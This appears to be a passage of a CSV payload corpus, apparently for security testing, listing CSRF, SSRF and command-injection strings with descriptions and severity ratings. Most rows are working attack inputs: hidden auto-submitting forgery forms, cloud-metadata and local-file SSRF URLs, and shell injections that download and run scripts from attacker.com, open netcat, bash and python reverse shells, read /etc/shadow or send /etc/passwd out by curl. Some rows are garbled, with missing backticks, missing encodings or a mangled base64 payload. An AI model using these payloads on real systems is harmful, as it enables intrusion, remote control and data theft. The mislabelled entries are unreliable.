csrf-088,CSRF with stealth iframe and form submission via postMessage,"<iframe id='f' style='display:none'></iframe><script>var i=document.getElementById('f');i.src='about:blank';i.onload=function(){var d=i.contentDocument||i.contentWindow.document;d.open();d.write('<form action=""https://target.com/api/steal"" method=""POST"" id=""form""><input name=""data"" value=""evil""/></form>');d.close();d.getElementById('form').submit();};</script>",Stealth iframe with postMessage,CSRF,critical,,
csrf-089,CSRF with obfuscated script using string split and join,<script>var s='ht'+'tp'+'s:'+'//ta'+'rget.com/api/evil';var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,String split and join obfuscation,CSRF,high,,
csrf-090,CSRF with script tag injection via innerHTML,"<div id='container'></div><script>document.getElementById('container').innerHTML='<form action=""https://target.com/api/hack"" method=""POST"" id=""f""><input name=""data"" value=""evil""/></form><script>document.getElementById(\'f\').submit();<\/script>';</script>",Script injection via innerHTML,CSRF,critical,,
csrf-091,CSRF with obfuscated base64 and eval,<script>eval(atob('dmFyIGY9ZG9jdW1lbnQuYWxlbWVudC5jcmVhdGVFbGVtZW50KCdmb3JtJyk7IGYuYWN0aW9uID0naHR0cHM6Ly90YXJnZXQuY29tL2FwaS9leGl0JztmLm1ldGhvZCA9J1BPU1QnOyB2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lucHV0Jyk7IGku bmFtZSA9J2RhdGEnOyBpLnZhbHVlID0nZXZpbCc7IGYucGFzc0NoaWxkKGlpKTsgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChmKTsgZi5zdWJtaXQoKTs='));</script>,Base64 encoded eval obfuscation,CSRF,critical,,
csrf-092,CSRF with SVG image and embedded script,"<svg xmlns='http://www.w3.org/2000/svg'><script><![CDATA[fetch('https://target.com/api/evil',{method:'POST',body:'data=evil'})]]></script></svg>",SVG embedded script,CSRF,high,,
csrf-093,CSRF with meta refresh and URL encoded payload,<meta http-equiv='refresh' content='0;url=https%3A%2F%2Ftarget.com%2Fapi%2Fupdate%3Fdata%3Devil'/>,Meta refresh with URL encoding,CSRF,medium,,
csrf-094,CSRF with JavaScript URL and obfuscated payload,"<a href=""javascript:(function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})()"">Click me</a>",JavaScript URL with obfuscation,CSRF,high,,
csrf-095,CSRF with hidden image and onerror event,"<img src='invalid.jpg' onerror=""var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='data';i.value='evil';f.appendChild(i);document.body.appendChild(f);f.submit();"" style='display:none'/>",Image onerror event trigger,CSRF,high,,
csrf-096,CSRF with obfuscated Unicode escapes,<script>var a=\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074;var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>,Unicode escape obfuscation,CSRF,high,,
csrf-097,CSRF with CSS expression to trigger script,"<div style=""width:expression((function(){var f=document.createElement('form');f.action='https://target.com/api/evil';f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();})())""></div>",CSS expression injection,CSRF,high,,
csrf-098,CSRF with XMLHttpRequest and obfuscated URL,"<script>var xhr=new XMLHttpRequest();var u='https://target.com/api/evil';xhr.open('POST',u,true);xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr.send('data=evil');</script>",XHR POST request,CSRF,critical,,
csrf-099,CSRF with form submission triggered by CSS animation,<style>@keyframes x{from{opacity:0}to{opacity:1}}</style><form action='https://target.com/api/evil' method='POST' id='f' style='animation:x 1s forwards' onanimationend='this.submit()'><input name='data' value='evil'/></form>,CSS animation event trigger,CSRF,medium,,
ssrf-001,Basic SSRF to internal IP,http://127.0.0.1/,Access internal localhost service,SSRF,high,,
ssrf-002,SSRF to internal private IP range,http://192.168.1.1/,Access internal network device,SSRF,high,,
ssrf-003,SSRF to metadata service on AWS,http://169.254.169.254/latest/meta-data/,AWS EC2 instance metadata,SSRF,critical,,
ssrf-004,SSRF to GCP metadata service,http://metadata.google.internal/computeMetadata/v1/,Google Cloud metadata,SSRF,critical,,
ssrf-005,SSRF to Azure instance metadata,http://169.254.169.254/metadata/instance?api-version=2021-02-01,Azure VM metadata,SSRF,critical,,
ssrf-006,SSRF to internal Redis service,redis://127.0.0.1:6379,Access internal Redis,SSRF,high,,
ssrf-007,SSRF to internal Memcached service,memcached://127.0.0.1:11211,Access internal Memcached,SSRF,high,,
ssrf-008,SSRF to internal FTP server,ftp://127.0.0.1/,Access internal FTP,SSRF,medium,,
ssrf-009,SSRF to internal SMB share,smb://192.168.1.100/share,Access internal SMB share,SSRF,high,,
ssrf-010,SSRF to internal Docker API,http://127.0.0.1:2375/containers/json,Access Docker API,SSRF,critical,,
ssrf-011,SSRF to internal Kubernetes API,https://kubernetes.default.svc/api,Access Kubernetes API,SSRF,critical,,
ssrf-012,SSRF to internal Jenkins API,http://127.0.0.1:8080/api/json,Access Jenkins API,SSRF,high,,
ssrf-013,SSRF to internal Elasticsearch cluster,http://127.0.0.1:9200/_cat/indices?v,Access Elasticsearch,SSRF,high,,
ssrf-014,SSRF to internal RabbitMQ management API,http://127.0.0.1:15672/api/overview,Access RabbitMQ API,SSRF,high,,
ssrf-015,SSRF to internal MySQL service,mysql://127.0.0.1:3306,Access MySQL service,SSRF,high,,
ssrf-016,SSRF to internal PostgreSQL service,postgresql://127.0.0.1:5432,Access PostgreSQL service,SSRF,high,,
ssrf-017,SSRF to internal SMTP server,smtp://127.0.0.1:25,Access SMTP server,SSRF,medium,,
ssrf-018,SSRF to internal SNMP service,snmp://127.0.0.1,Access SNMP service,SSRF,medium,,
ssrf-019,SSRF to internal LDAP service,ldap://127.0.0.1:389,Access LDAP service,SSRF,high,,
ssrf-021,SSRF with URL encoded internal IP,http://%31%39%32.%31%36%38.%31.%31/,URL encoded internal IP,SSRF,high,,
ssrf-022,SSRF with octal encoded IP,http://0300.0250.0001.0001/,Octal encoded IP address,SSRF,high,,
ssrf-023,SSRF with decimal encoded IP,http://3232235777/,Decimal encoded IP address,SSRF,high,,
ssrf-024,SSRF with IPv6 loopback,http://[::1]/,IPv6 localhost,SSRF,high,,
ssrf-025,SSRF with file protocol to read local file,file:///etc/passwd,Local file read attempt,SSRF,critical,,
ssrf-026,SSRF with gopher protocol to send raw TCP,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,Gopher protocol to Redis,SSRF,critical,,
ssrf-027,SSRF with data URI scheme,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",Data URI with embedded script,SSRF,medium,,
ssrf-028,SSRF with javascript URI scheme,javascript:alert('SSRF'),JavaScript URI scheme,SSRF,low,,
ssrf-029,SSRF with file descriptor access,file:///proc/self/environ,Access process environment,SSRF,critical,,
ssrf-030,SSRF with nested URL encoding,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd,Nested URL encoded path traversal,SSRF,critical,,
ssrf-031,SSRF with FTP protocol and directory traversal,ftp://127.0.0.1/../../../../etc/passwd,FTP directory traversal,SSRF,critical,,
ssrf-032,SSRF with SMB protocol and UNC path,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts,SMB UNC path traversal,SSRF,critical,,
ssrf-033,SSRF with HTTP request smuggling attempt,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,HTTP request smuggling,SSRF,critical,,
ssrf-034,SSRF with HTTP header injection,"http://127.0.0.1:80/
X-Injected-Header: evil",HTTP header injection,SSRF,critical,,
ssrf-035,SSRF with HTTP basic auth to internal service,http://admin:password@127.0.0.1/admin,Basic auth credentials,SSRF,high,,
ssrf-036,SSRF with HTTP redirect to internal IP,http://external.com/redirect?url=http://127.0.0.1/,Redirect to internal IP,SSRF,high,,
ssrf-037,SSRF with DNS rebinding attack,http://evil.com/,DNS rebinding to internal IP,SSRF,critical,,
ssrf-038,SSRF with IPv4 mapped IPv6 address,http://[::ffff:127.0.0.1]/,IPv4 mapped IPv6,SSRF,high,,
ssrf-039,SSRF with encoded newline characters,http://127.0.0.1/%0a%0d,Encoded newline injection,SSRF,medium,,
ssrf-040,SSRF with HTTP POST method override,http://127.0.0.1/?_method=POST,Method override parameter,SSRF,medium,,
ssrf-041,SSRF with HTTP chunked transfer encoding,http://127.0.0.1/chunked,Chunked transfer encoding test,SSRF,medium,,
ssrf-042,SSRF with HTTP TRACE method,http://127.0.0.1/trace,HTTP TRACE method test,SSRF,medium,,
ssrf-043,SSRF with HTTP OPTIONS method,http://127.0.0.1/options,HTTP OPTIONS method test,SSRF,medium,,
ssrf-044,SSRF with HTTP CONNECT method,http://127.0.0.1/connect,HTTP CONNECT method test,SSRF,medium,,
ssrf-045,SSRF with HTTP PATCH method,http://127.0.0.1/patch,HTTP PATCH method test,SSRF,medium,,
ssrf-046,SSRF with HTTP DELETE method,http://127.0.0.1/delete,HTTP DELETE method test,SSRF,medium,,
ssrf-047,SSRF with HTTP PUT method,http://127.0.0.1/put,HTTP PUT method test,SSRF,medium,,
ssrf-048,HTTP PUT method test,http://127.0.0.1/put,HTTP PUT method test,SSRF,medium,,
ssrf-049,SSRF with HTTP header injection via URL,"http://127.0.0.1/
X-Forwarded-For: 127.0.0.1",Inject X-Forwarded-For header,SSRF,high,,
ssrf-051,SSRF with dict protocol to query dictionary service,dict://127.0.0.1/,Access internal dictionary service,SSRF,medium,,
ssrf-052,SSRF with telnet protocol,telnet://127.0.0.1:23,Access internal telnet service,SSRF,medium,,
ssrf-053,SSRF with ldap protocol to query LDAP server,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",LDAP query,SSRF,high,,
ssrf-054,SSRF with rdp protocol,rdp://127.0.0.1:3389,Access internal RDP service,SSRF,medium,,
ssrf-055,SSRF with smb protocol to access Windows share,smb://127.0.0.1/share,Access SMB share,SSRF,high,,
ssrf-056,SSRF with nfs protocol,nfs://127.0.0.1/export,Access NFS export,SSRF,medium,,
ssrf-057,SSRF with imap protocol,imap://127.0.0.1:143,Access IMAP mail server,SSRF,medium,,
ssrf-058,SSRF with pop3 protocol,pop3://127.0.0.1:110,Access POP3 mail server,SSRF,medium,,
ssrf-059,SSRF with mqtt protocol,mqtt://127.0.0.1:1883,Access MQTT broker,SSRF,medium,,
ssrf-060,SSRF with ws protocol (WebSocket),ws://127.0.0.1:8080/,Access WebSocket service,SSRF,medium,,
ssrf-061,SSRF with wss protocol (Secure WebSocket),wss://127.0.0.1:8443/,Access secure WebSocket service,SSRF,medium,,
ssrf-062,SSRF with bitcoin protocol,bitcoin://127.0.0.1/,Bitcoin protocol scheme,SSRF,low,,
ssrf-063,SSRF with magnet protocol,magnet:?xt=urn:btih:abcdef1234567890,Magnet link protocol,SSRF,low,,
ssrf-064,SSRF with ssh protocol,ssh://127.0.0.1:22,Access SSH service,SSRF,medium,,
ssrf-065,SSRF with tel protocol,tel:+1234567890,Telephone protocol,SSRF,low,,
ssrf-066,SSRF with sms protocol,sms:+1234567890,SMS protocol,SSRF,low,,
ssrf-067,SSRF with geo protocol,"geo:37.786971,-122.399677",Geolocation protocol,SSRF,low,,
ssrf-068,SSRF with svn protocol,svn://127.0.0.1/repo,Subversion protocol,SSRF,medium,,
ssrf-069,SSRF with git protocol,git://127.0.0.1/repo.git,Git protocol,SSRF,medium,,
ssrf-071,SSRF with double URL encoding,http://%2531%25327%2532%253E%253E%253E/,Double URL encoded IP,SSRF,high,,
ssrf-072,SSRF with mixed case scheme to bypass filters,HtTp://127.0.0.1/,Mixed case HTTP scheme,SSRF,medium,,
ssrf-073,SSRF with embedded null byte to bypass filters,http://127.0.0.1%00.example.com/,Null byte injection,SSRF,high,,
ssrf-074,SSRF with CRLF injection in URL,"http://127.0.0.1/
Set-Cookie:evil=1",CRLF injection,SSRF,critical,,
ssrf-075,SSRF with protocol chaining using gopher,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,Gopher protocol to Redis,SSRF,critical,,
ssrf-076,SSRF with IPv6 embedded IPv4 and port,http://[::ffff:192.168.1.1]:8080/,IPv6 embedded IPv4 with port,SSRF,high,,
ssrf-077,SSRF with DNS rebinding via external domain,http://evil.com/,DNS rebinding attack,SSRF,critical,,
ssrf-078,SSRF with HTTP header injection via URL encoding,http://127.0.0.1/%0d%0aX-Injected-Header:evil,HTTP header injection,SSRF,critical,,
ssrf-079,SSRF with HTTP request smuggling attempt,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,Request smuggling,SSRF,critical,,
ssrf-080,SSRF with file protocol and directory traversal,file:///etc/passwd%00,File read with null byte,SSRF,critical,,
ssrf-081,SSRF with HTTP basic auth and URL encoding,http://admin%3Apassword@127.0.0.1/,Basic auth with encoding,SSRF,high,,
ssrf-082,SSRF with HTTP redirect to internal IP,http://external.com/redirect?url=http://127.0.0.1/,Redirect to internal IP,SSRF,high,,
ssrf-083,SSRF with HTTP POST method override,http://127.0.0.1/?_method=POST,Method override,SSRF,medium,,
ssrf-084,SSRF with HTTP chunked transfer encoding,http://127.0.0.1/chunked,Chunked transfer encoding,SSRF,medium,,
ssrf-085,SSRF with HTTP TRACE method,http://127.0.0.1/trace,HTTP TRACE method,SSRF,medium,,
ssrf-086,SSRF with HTTP OPTIONS method,http://127.0.0.1/options,HTTP OPTIONS method,SSRF,medium,,
ssrf-087,SSRF with HTTP CONNECT method,http://127.0.0.1/connect,HTTP CONNECT method,SSRF,medium,,
ssrf-088,SSRF with HTTP PATCH method,http://127.0.0.1/patch,HTTP PATCH method,SSRF,medium,,
ssrf-089,SSRF with HTTP DELETE method,http://127.0.0.1/delete,HTTP DELETE method,SSRF,medium,,
ssrf-090,SSRF with HTTP PUT method,http://127.0.0.1/put,HTTP PUT method,SSRF,medium,,
ssrf-091,SSRF with IPv4 in hexadecimal,http://0x7f.0x0.0x0.0x1/,Hexadecimal IPv4 address,SSRF,high,,
ssrf-092,SSRF with IPv4 in mixed notation,http://127.1/,Shortened IPv4 address,SSRF,high,,
ssrf-093,SSRF with IPv4 in integer format,http://2130706433/,Integer IPv4 address,SSRF,high,,
ssrf-094,SSRF with HTTP userinfo section to bypass filters,http://127.0.0.1@evil.com/,Userinfo in URL,SSRF,high,,
ssrf-095,SSRF with HTTP URL fragment,http://127.0.0.1/#fragment,URL fragment,SSRF,low,,
ssrf-096,SSRF with HTTP URL query parameter injection,http://127.0.0.1/?param=value,Query parameter,SSRF,low,,
ssrf-097,SSRF with HTTP URL path traversal,http://127.0.0.1/../../../../etc/passwd,Path traversal,SSRF,critical,,
ssrf-098,SSRF with HTTP URL encoded path traversal,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd,URL encoded path traversal,SSRF,critical,,
ssrf-099,SSRF with HTTP URL encoded double slash,http://127.0.0.1/%2f%2f/etc/passwd,Encoded double slash,SSRF,critical,,
cmdinj-001,Basic command injection with semicolon,; ls -la,Inject list directory command,Command Injection,high,,
cmdinj-002,Command injection with && operator,&& cat /etc/passwd,Inject read passwd file,Command Injection,critical,,
cmdinj-003,Command injection with pipe operator,| whoami,Inject whoami command,Command Injection,high,,
cmdinj-004,Command injection with backticks,id,Inject id command using backticks,Command Injection,high,,
cmdinj-005,Command injection with $() syntax,$(uname -a),Inject uname command,Command Injection,high,,
cmdinj-006,Command injection with nested $(),$(echo $(whoami)),Nested command substitution,Command Injection,high,,
cmdinj-007,Command injection with ampersand and sleep,& sleep 10,Inject sleep command for timing attack,Command Injection,medium,,
cmdinj-008,Command injection with newline character,"&& echo 'injected'
",Inject command with newline,Command Injection,high,,
cmdinj-009,Command injection with semicolon and curl,; curl http://attacker.com,Exfiltrate data via curl,Command Injection,critical,,
cmdinj-010,Command injection with semicolon and wget,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute malware,Command Injection,critical,,
cmdinj-011,Command injection with pipe and netcat reverse shell,| nc attacker.com 4444 -e /bin/sh,Reverse shell via netcat,Command Injection,critical,,
cmdinj-012,Command injection with backticks and whoami,whoami,Execute whoami command,Command Injection,high,,
cmdinj-013,Command injection with $() and id,$(id),Execute id command,Command Injection,high,,
cmdinj-014,Command injection with semicolon and echo,; echo injected,Simple echo injection,Command Injection,medium,,
cmdinj-015,Command injection with && and cat /etc/shadow,&& cat /etc/shadow,Read shadow file,Command Injection,critical,,
cmdinj-016,Command injection with semicolon and id,; id,Execute id command,Command Injection,high,,
cmdinj-017,Command injection with pipe and env,| env,Print environment variables,Command Injection,medium,,
cmdinj-018,Command injection with backticks and ls,ls /,List root directory,Command Injection,high,,
cmdinj-019,Command injection with $() and ps,$(ps aux),List running processes,Command Injection,medium,,
cmdinj-021,Command injection with URL encoding,%3B%20id,URL encoded semicolon and id command,Command Injection,high,,
cmdinj-022,Command injection with nested backticks,`echo \whoami\`,Nested backticks execution,Command Injection,high,,
cmdinj-023,Command injection with environment variable,; echo $USER,Print current user environment variable,Command Injection,medium,,
cmdinj-024,Command injection with hex encoded characters,; echo injected,Hex encoded space character,Command Injection,medium,,
cmdinj-025,Command injection with base64 encoded command,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,Command Injection,critical,,
cmdinj-026,Command injection with command substitution and sleep,$(sleep 10),Timing attack with sleep,Command Injection,medium,,
cmdinj-027,Command injection with semicolon and nested $(),; echo $(whoami),Nested command substitution,Command Injection,high,,
cmdinj-028,Command injection with backslash escaping,; echo injected\; ls,Escape semicolon,Command Injection,medium,,
cmdinj-029,Command injection with multiple command separators,; ls -la && whoami || echo failed,Multiple command chaining,Command Injection,high,,
cmdinj-030,Command injection with command grouping,; (id; uname -a),Grouped commands,Command Injection,high,,
cmdinj-031,Command injection with subshell,; (sleep 5),Subshell with sleep,Command Injection,medium,,
cmdinj-032,Command injection with command chaining and comments,; ls -la #,Command injection with comment,Command Injection,medium,,
cmdinj-033,Command injection with backticks and nested $(),echo $(whoami),Nested command execution,Command Injection,high,,
cmdinj-034,Command injection with semicolon and environment variable expansion,; echo $PATH,Print PATH environment variable,Command Injection,medium,,
cmdinj-035,Command injection with command substitution and echo,$(echo injected),Echo injected string,Command Injection,medium,,
cmdinj-036,Command injection with semicolon and nested subshell,; (echo injected; whoami),Multiple commands in subshell,Command Injection,high,,
cmdinj-037,Command injection with semicolon and sleep for timing,; sleep 15,Timing attack,Command Injection,medium,,
cmdinj-038,Command injection with pipe and reverse shell,| nc attacker.com 4444 -e /bin/sh,Reverse shell via netcat,Command Injection,critical,,
cmdinj-039,Command injection with semicolon and wget download,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-040,Command injection with semicolon and curl download,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-041,Command injection with semicolon and base64 decode,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,Command Injection,critical,,
cmdinj-042,Command injection with semicolon and environment variable manipulation,; export MALICIOUS=1,Set environment variable,Command Injection,medium,,
cmdinj-043,Command injection with semicolon and echo to file,; echo 'malicious' > /tmp/malicious.txt,Write to file,Command Injection,medium,,
cmdinj-044,Command injection with semicolon and chmod,; chmod +x /tmp/m.sh,Change file permissions,Command Injection,medium,,
cmdinj-045,Command injection with semicolon and cat /etc/shadow,; cat /etc/shadow,Read shadow file,Command Injection,critical,,
cmdinj-046,Command injection with semicolon and echo with special characters,; echo 'injected; ls -la',Echo with special characters,Command Injection,medium,,
cmdinj-047,Command injection with semicolon and nested command with quotes,"; echo ""$(whoami)""",Nested command with quotes,Command Injection,high,,
cmdinj-048,Command injection with semicolon and awk command,"; awk 'BEGIN {system(""id"")}'",Execute command via awk,Command Injection,high,,
cmdinj-049,Command injection with semicolon and perl command,; perl -e 'print id',Execute command via perl,Command Injection,high,,
cmdinj-051,Windows cmd injection with & separator,& whoami,Execute whoami command,Command Injection,high,,
cmdinj-052,Windows cmd injection with | separator,| dir,List directory contents,Command Injection,high,,
cmdinj-053,Windows cmd injection with && separator,&& ipconfig,Display network config,Command Injection,high,,
cmdinj-054,Windows cmd injection with || separator,|| net user,List users,Command Injection,high,,
cmdinj-055,Windows PowerShell injection with semicolon,; Get-Process,List running processes,Command Injection,high,,
cmdinj-056,Windows PowerShell injection with backtick,whoami,Execute whoami,Command Injection,high,,
cmdinj-057,Windows PowerShell injection with $(),$(Get-ChildItem),List directory contents,Command Injection,high,,
cmdinj-058,Windows PowerShell injection with Start-Process,; Start-Process notepad.exe,Launch notepad,Command Injection,medium,,
cmdinj-059,Windows cmd injection with echo to file,& echo injected > C:\Windows\Temp\injected.txt,Write to file,Command Injection,medium,,
cmdinj-060,Windows cmd injection with netcat reverse shell,& nc attacker.com 4444 -e cmd.exe,Reverse shell,Command Injection,critical,,
cmdinj-061,macOS/Linux injection with semicolon and whoami,; whoami,Execute whoami,Command Injection,high,,
cmdinj-062,macOS/Linux injection with pipe and id,| id,Execute id,Command Injection,high,,
cmdinj-063,macOS/Linux injection with && and uname,&& uname -a,System info,Command Injection,high,,
cmdinj-064,macOS/Linux injection with backticks and ls,ls /,List root directory,Command Injection,high,,
cmdinj-065,macOS/Linux injection with $() and ps,$(ps aux),List processes,Command Injection,medium,,
cmdinj-066,macOS/Linux injection with semicolon and curl download,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-067,macOS/Linux injection with semicolon and wget download,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Download and execute script,Command Injection,critical,,
cmdinj-068,macOS/Linux injection with semicolon and base64 decode,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Base64 encoded reverse shell,Command Injection,critical,,
cmdinj-069,Windows PowerShell injection with encoded command,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=,Encoded PowerShell command,Command Injection,high,,
cmdinj-070,Windows cmd injection with for loop,"& for /L %i in (1,1,5) do @echo %i",Loop command,Command Injection,medium,,
cmdinj-071,Windows PowerShell injection with Invoke-Expression,; Invoke-Expression 'whoami',Execute command,Command Injection,high,,
cmdinj-072,macOS/Linux injection with semicolon and env,; env,Print environment variables,Command Injection,medium,,
cmdinj-073,macOS/Linux injection with semicolon and cat /etc/passwd,; cat /etc/passwd,Read passwd file,Command Injection,critical,,
cmdinj-074,Windows cmd injection with reg query,& reg query HKLM\Software,Query registry,Command Injection,medium,,
cmdinj-075,Windows PowerShell injection with Get-Content,; Get-Content C:\Windows\System32\drivers\etc\hosts,Read hosts file,Command Injection,high,,
cmdinj-076,macOS/Linux injection with semicolon and dmesg,; dmesg,Kernel messages,Command Injection,medium,,
cmdinj-077,macOS/Linux injection with semicolon and netstat,; netstat -an,Network connections,Command Injection,medium,,
cmdinj-078,Windows cmd injection with tasklist,& tasklist,List running tasks,Command Injection,medium,,
cmdinj-079,Windows PowerShell injection with Get-Service,; Get-Service,List services,Command Injection,medium,,
cmdinj-080,macOS/Linux injection with semicolon and ps aux,; ps aux,List processes,Command Injection,medium,,
cmdinj-081,Windows cmd injection with echo and pipe,& echo injected | findstr injected,Echo and filter output,Command Injection,medium,,
cmdinj-082,Windows PowerShell injection with Start-Process and hidden window,; Start-Process notepad.exe -WindowStyle Hidden,Launch process hidden,Command Injection,medium,,
cmdinj-083,macOS/Linux injection with semicolon and curl to exfiltrate data,; curl http://attacker.com/?data=$(cat /etc/passwd),Exfiltrate data via curl,Command Injection,critical,,
cmdinj-084,Windows cmd injection with powershell encoded command,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Encoded PowerShell payload,Command Injection,high,,
cmdinj-085,macOS/Linux injection with semicolon and nc reverse shell,; nc attacker.com 4444 -e /bin/bash,Reverse shell via netcat,Command Injection,critical,,
cmdinj-086,Windows cmd injection with certutil download,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Download and execute file,Command Injection,critical,,
cmdinj-087,macOS/Linux injection with semicolon and bash reverse shell,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Reverse shell via bash,Command Injection,critical,,
cmdinj-088,Windows PowerShell injection with Invoke-WebRequest,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Download and execute PowerShell script,Command Injection,critical,,
cmdinj-089,macOS/Linux injection with semicolon and python reverse shell,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Reverse shell via python,Command Injection,critical,,
cmdinj-091,Obfuscated command injection using environment variable concatenation,; e${IFS}cho injected,Bypass simple filters using ${IFS} (space) variable,Command Injection,high,,
cmdinj-092,Command injection using Unicode encoding,; echo injected,Unicode encoded echo command,Command Injection,high,,
cmdinj-093,Command injection with double URL encoding,%253B%2520id,Double URL encoded semicolon and id,Command Injection,high,,
cmdinj-094,Command injection using variable substitution and command chaining,; VAR=whoami; $VAR,Use variable to execute command,Command Injection,high,,
cmdinj-095,Command injection using nested base64 decoding and execution,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Decode and execute base64 payload,Command Injection,critical,,
cmdinj-096,Command injection using less common command separator (newline),"&& echo injected
id",Use newline as command separator,Command Injection,high,,
cmdinj-097,Command injection using PowerShell encoded command with obfuscation,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Obfuscated PowerShell encoded command,Command Injection,critical,,
cmdinj-098,Command injection using command substitution with nested quotes,"; echo $(echo ""$(whoami)"")",Nested command substitution with quotes,Command Injection,high,,
cmdinj-099,Command injection using environment variable and indirect expansion,; export CMD=whoami; ${CMD},Indirect command execution via env var,Command Injection,high,,
